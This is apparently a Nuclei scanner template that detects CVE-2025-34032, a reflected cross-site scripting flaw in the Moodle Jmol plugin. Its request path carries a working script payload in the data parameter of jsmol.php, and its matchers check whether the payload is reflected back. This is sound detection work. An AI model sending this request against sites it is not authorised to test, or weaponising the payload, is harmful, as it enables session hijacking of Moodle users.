http:
- matchers:
  - condition: and
    dsl:
    - len(body) == 41
    - status_code == 200
    - contains(content_type, "text/html")
    type: dsl
  - regex:
    - ^<script>alert\(document\.domain\)</script>\s*$
    type: regex
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&data=%3Cscript%3Ealert(document.domain)%3C/script%3E&mimetype=text/html'
id: CVE-2025-34032
info:
  author: madrobot,ritikchaddha
  classification:
    cve-id: CVE-2025-34032
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-80
    epss-percentile: 0.30924
    epss-score: 0.00115
  description: 'A reflected cross-site scripting (XSS) vulnerability exists in the
    Moodle LMS Jmol plugin version 6.1 and prior via the data parameter in jsmol.php.
    The application fails to properly sanitize user input before embedding it into
    the HTTP response, allowing an attacker to execute arbitrary JavaScript in the
    victim''s browser by crafting a malicious link. This can be used to hijack user
    sessions or manipulate page content.

    '
  impact: 'Attackers can execute arbitrary JavaScript in victim browsers through crafted
    links containing XSS payloads in the data parameter, potentially leading to session
    hijacking.

    '
  metadata:
    max-request: 1
  name: Moodle LMS Jmol Plugin <= 6.1 - Cross-Site Scripting
  reference:
  - https://www.dionach.com/blog/moodle-jmol-plugin-multiple-vulnerabilities/
  - https://nvd.nist.gov/vuln/detail/CVE-2025-34032
  remediation: 'Upgrade to a patched version of Moodle Jmol plugin that properly sanitizes
    user input in jsmol.php.

    '
  severity: medium
  tags: cve,cve2025,moodle,xss,edb,vkev,vuln
